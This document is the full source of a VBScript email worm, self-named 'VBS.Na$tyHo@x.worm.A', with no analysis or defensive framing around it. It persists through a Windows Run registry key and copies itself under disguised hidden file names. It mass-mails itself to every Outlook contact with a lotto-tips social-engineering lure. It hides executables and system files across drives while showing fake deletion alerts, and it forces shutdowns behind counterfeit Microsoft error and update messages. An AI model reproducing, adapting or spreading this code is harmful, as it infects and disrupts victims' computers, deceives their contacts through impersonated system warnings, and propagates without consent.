On Error Resume Next
Set CHECKREG = CreateObject("WScript.Shell")
If CHECKREG.RegRead("HKLM\SOFTWARE\NyHx\Start_NyHx") <> 1 Then
Set NEWREG = CreateObject("WScript.Shell")
NEWREG.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\uBeenHoaxd","C:\WINDOWS\System32\Top 10 Lotto Tips.doc.vbs"
Set COPYREG = CreateObject("Scripting.FileSystemObject")
COPYREG.CopyFile WScript.ScriptFullName, "C:\Program Files\WindowsUpdate\IEUpdate.xml.vbs"

Set HIDEVBS = CreateObject("Scripting.FileSystemObject")
Const ATTRIB1 = 34
Set VBSHIDDEN = HIDEVBS.GetFile("C:\Program Files\WindowsUpdate\IEUpdate.xml.vbs")
VBSHIDDEN.Attributes = ATTRIB1

Set NEWBATCH = CreateObject("Scripting.FileSystemObject")
Set BATCH1 = NEWBATCH.CreateTextFile("C:\WINDOWS\system32\MSXPS.bat")
BATCH1.WriteLine "CLS"
BATCH1.WriteLine "@ECHO OFF"
BATCH1.WriteLine "SHUTDOWN -s -t 30 -c ""System_Error:    Microsoft Xp has encounted some serious errors or has lost some important files, Your system will shutdown in (30) seconds if you choose to restart you may need to reinstall some files.!"&""""
BATCH1.WriteLine "CLS"
BATCH1.Close

Set HIDEBATCH1 = CreateObject("Scripting.FileSystemObject")
Const ATTRIB2 = 34
Set BATCH1HIDDEN = HIDEBATCH1.GetFile("C:\WINDOWS\system32\MSXPS.bat")
BATCH1HIDDEN.Attributes = ATTRIB2

On Error Resume Next 
Set FSO = CreateObject ("Scripting.FileSystemObject") 
Set OUTLOOKAPP = CreateObject ("Outlook.Application") 
Set ENTRYCOUNT = WScript.CreateObject ("Outlook.Application")
Set MAPISPACE = ENTRYCOUNT.GetNameSpace ("MAPI") 
Set VICTIMSADDRESS = MAPISPACE.AddressLists (1) 
For RELOOP = 1 To VICTIMSADDRESS.AddressEntries.Count 
Set SPAMMAIL = OUTLOOKAPP.CreateItem (0) 
SPAMMAIL.To = OUTLOOKAPP.GetNameSpace("MAPI").AddressLists(1).AddressEntries(RELOOP) 
SPAMMAIL.Subject = "Re: Top 10 ways to select your winning lotto numbers..!" 
SPAMMAIL.Body = "Please read the document that is attached to this email for the top 10 tips..!" & vbCrLf & "I made $1500 2 days after reading the document, I was so amazed...!"
SPAMMAIL.Attachments.Add Wscript.ScriptFullName
SPAMMAIL.DeleteAfterSubmit = True
SPAMMAIL.Send 
Next 
OUTLOOKAPP.Quit

Else
If CHECKREG.RegRead ("HKLM\SOFTWARE\NyHx\Start_NyHx") = 1 then
NASTYHOAXMSG()
End If
End If

Set NEWREG = CreateObject("WScript.Shell") 
NEWREG.RegWrite "HKLM\SOFTWARE\NyHx\Start_NyHx", 1, "REG_DWORD" 
Set FSO = CreateObject("Scripting.FileSystemObject")
Set DRIVES = FSO.DRIVES
For Each DRIVE In DRIVES
If Drive.DriveType = 2 Or Drive.DriveType = 3 Then
HIDEFILES (DRIVE)
End If
Next

Function HIDEFILES(PATH)
Set FSO = CreateObject("Scripting.FileSystemObject")
Set FOLDER = FSO.GetFolder(PATH)
Set FILES = FOLDER.FILES
For Each FILE In FILES
SEARCHEXTNAME = FSO.GetExtensionName(FILE.PATH)
If (SEARCHEXTNAME = "exe") Or (SEARCHEXTNAME = "dll") Or (SEARCHEXTNAME = "log") Or (SEARCHEXTNAME = "ini") Or (SEARCHEXTNAME = "INI") Then
Set FILEATTRIB = FSO.GetFile(FILE.PATH)
FILEATTRIB.Attributes = 34
MsgBox "Now Deleting File :" & vbCrLf & vbCrLf & FILE.PATH, 16, "Critical System Error :"
End If
Next
Set SUBFOLDERS = FOLDER.SUBFOLDERS
For Each SUBFOLDER In SUBFOLDERS
HIDEFILES SUBFOLDER.PATH
Next
Set XX = CreateObject("WScript.Shell")
XX.Run "C:\WINDOWS\system32\MSXPS.bat"
End Function

Sub NASTYHOAXMSG()
Set DELETEBATCH = CreateObject("Scripting.FileSystemObject")
DELETEBATCH.DeleteFile("C:\WINDOWS\system32\MSXPS.bat")
Set RENEWBATCH = CreateObject("Scripting.FileSystemObject")
Set BATCH2 = RENEWBATCH.CreateTextFile("C:\WINDOWS\system32\MSXPS.bat")
BATCH2.WriteLine "CLS"
BATCH2.WriteLine "@ECHO OFF"
BATCH2.WriteLine "SHUTDOWN -s -t 30 -c ""System_Infection:    YOUR SYSTEM HAS BEEN INFECTED WITH THE ~ VBS.Na$tyHo@x.worm.A ~ VIRUS..!! "&""""
BATCH2.WriteLine "CLS"
BATCH2.Close

MSGNASTYHOAX = "Microsoft is giving you a reminder to update all your software" & vbCrLf
MSGNASTYHOAX = MSGNASTYHOAX & " This means please pay most attention to :" & vbCrLf & vbCrLf
MSGNASTYHOAX = MSGNASTYHOAX & "  - Microsoft Windows sofware updates" & vbCrLf
MSGNASTYHOAX = MSGNASTYHOAX & "  - anti-virus software updates" & vbCrLf
MSGNASTYHOAX = MSGNASTYHOAX & "  - Other software updates that you may have on your computer" & vbCrLf & vbCrLf
MSGNASTYHOAX = MSGNASTYHOAX & "This is the most sufficiant way to keep out THESE nasty viruses & intruders..!!"
MsgBox MSGNASTYHOAX, 64, "Microsoft Update Reminder"

Set HIDEBATCH2 = CreateObject("Scripting.FileSystemObject")
Const ATTRIB3 = 34
Set BATCH1HIDDEN = HIDEBATCH2.GetFile("C:\WINDOWS\system32\MSXPS.bat")
BATCH1HIDDEN.Attributes = ATTRIB3
Set XX = CreateObject("WScript.Shell")
XX.Run "C:\WINDOWS\system32\MSXPS.bat"
End Sub 